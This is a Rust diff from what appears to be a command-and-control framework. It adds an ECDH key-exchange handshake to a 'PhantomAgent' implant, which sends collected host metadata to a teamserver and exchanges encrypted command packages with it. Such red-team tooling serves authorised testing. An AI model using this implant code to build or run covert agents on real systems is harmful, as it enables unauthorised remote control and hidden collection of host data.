@@ -1,8 +1,10 @@
 //! Agent-level HTTP transport methods: handshake, job polling, and packet send.
 
-use red_cell_common::demon::{DemonCommand, DemonPackage};
+use red_cell_common::agent_protocol::serialize_init_metadata;
+use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};
 
 use super::PhantomAgent;
+use crate::ecdh::{decode_listener_pub_key, perform_registration, send_session_packet};
 use crate::error::PhantomError;
 use crate::protocol::{
     build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
@@ -54,5 +56,47 @@ impl PhantomAgent {
     pub(super) async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
         let _response = self.transport.send(&packet).await?;
         Ok(())
+    }
+
+    /// Perform the ECDH registration handshake.
+    ///
+    /// Encodes agent metadata, performs X25519 ECDH with the listener, and stores
+    /// the resulting session for all subsequent packets. Sets `self.agent_id` to
+    /// the value assigned by the teamserver.
+    pub async fn ecdh_init_handshake(&mut self) -> Result<(), PhantomError> {
+        let key_str = self
+            .config
+            .listener_pub_key
+            .as_deref()
+            .ok_or(PhantomError::InvalidConfig("listener_pub_key required for ECDH"))?;
+        let listener_pub_key = decode_listener_pub_key(key_str)?;
+
+        let metadata = self.collect_metadata();
+        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)
+            .map_err(|e| PhantomError::Transport(format!("ECDH metadata encode: {e}")))?;
+
+        let session = perform_registration(&self.transport, &listener_pub_key, &metadata_bytes)
+            .await
+            .map_err(|e| PhantomError::Transport(format!("ECDH registration: {e}")))?;
+
+        self.agent_id = session.agent_id;
+        self.ecdh_session = Some(session);
+        Ok(())
+    }
+
+    /// Send packages as an ECDH session packet and return the decrypted response bytes.
+    pub(super) async fn ecdh_send_packages(
+        &mut self,
+        packages: Vec<DemonPackage>,
+    ) -> Result<Vec<u8>, PhantomError> {
+        let session = self
+            .ecdh_session
+            .as_ref()
+            .ok_or(PhantomError::Transport("ECDH session not initialized".into()))?
+            .clone();
+        let payload = DemonMessage::new(packages)
+            .to_bytes()
+            .map_err(|e| PhantomError::Transport(format!("ECDH message encode: {e}")))?;
+        send_session_packet(&self.transport, &session, &payload).await
     }
 }
